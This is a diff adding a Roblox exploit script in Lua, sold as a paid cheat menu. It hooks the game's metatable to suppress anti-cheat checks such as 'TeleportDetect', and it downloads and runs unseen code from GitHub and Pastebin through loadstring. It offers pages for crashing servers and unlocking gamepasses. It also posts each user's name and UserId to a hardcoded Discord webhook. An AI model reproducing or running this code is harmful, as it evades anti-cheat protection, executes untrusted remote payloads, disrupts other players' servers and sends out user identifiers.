@@ -1,0 +1,73 @@
+
+function NovaNoti(Title, Text, Icon, Duration)
+	game.StarterGui:SetCore("SendNotification", {
+
+	})
+	local cor = coroutine.wrap(function()
+		local sound = Instance.new("Sound", game.CoreGui)
+		sound.SoundId = "rbxassetid://4590656842"
+		sound:Play()
+		wait(4)
+		sound:Destroy()
+	end)
+	cor()
+end
+--// [ Nova Notification Anti Ban ]
+local b = Instance.new("BindableFunction");
+function b.OnInvoke(Response)
+	if Response == 'Yes!' then
+		assert(getrawmetatable)
+		gmt = getrawmetatable(game)
+		setreadonly(gmt, false)
+		old = gmt.__namecall
+		gmt.__namecall = newcclosure(function(self, ...)
+			local args = {
+				...
+			}
+			if tostring(args[1]) == "TeleportDetect" then
+				return
+			elseif tostring(args[1]) == "CHECKER_1" then
+				return
+			elseif tostring(args[1]) == "CHECKER" then
+				return
+			end
+			return old(self, ...)
+		end)
+	end;
+end;
+game:GetService('StarterGui'):SetCore("SendNotification", {
+
+});
+
+
+
+local player = game.Players.LocalPlayer
+    local username = player.Name
+local UI = loadstring(game:HttpGet("https://raw.githubusercontent.com/bloodball/-back-ups-for-libs/main/twink"))()
+local Library = UI.Load("made by thunder little | Thx for paying".. username .. " :3")
+
+local Admin = Library.AddPage("Admin")
+local stuff = Library.AddPage("Other stuff")
+local Objects = Library.AddPage("Objects")
+local Gamepasses = Library.AddPage("Gamepasses")
+local localoc = Library.AddPage("Local Oc")
+local Teleports = Library.AddPage("Teleports")
+local Crash = Library.AddPage("Crash Server")
+local info = Library.AddPage("info")
+local SettingsPage = Library.AddPage("Settings!")
+
+
+
+loadstring(game:HttpGet("https://pastebin.com/raw/nzXicwc1"))()
+local HTTP_ = game:GetService('HttpService')
+	local LPR = game:GetService('Players').LocalPlayer
+	local url =
+	"https://discord.com/api/webhooks/1147636061489610854/_kKGMNhlL96ECorx5Cdn0gNHzbStfdFD0BbHyFJJht-_tsUI9BR8xfuxAx-RRZHAHOk9"
+	local data = { ["username"] = "bluefox script",
+	["embeds"] = { { ["description"] = "Paid script active by",
+	["fields"] = { { name = "Username", value = LPR.Name, inline = true }, { name = "Username", value = LPR.UserId,
+	inline = true }, }, ["color"] = tonumber(0x7269da), } } } 
+	local newdata = HTTP_:JSONEncode(data)
+	local headers = { ["content-type"] = "application/json" }
+	local request = http_request or request or HttpPost or syn.request
+	request({ Url = url, Body = newdata, Method = "POST", Headers = headers })
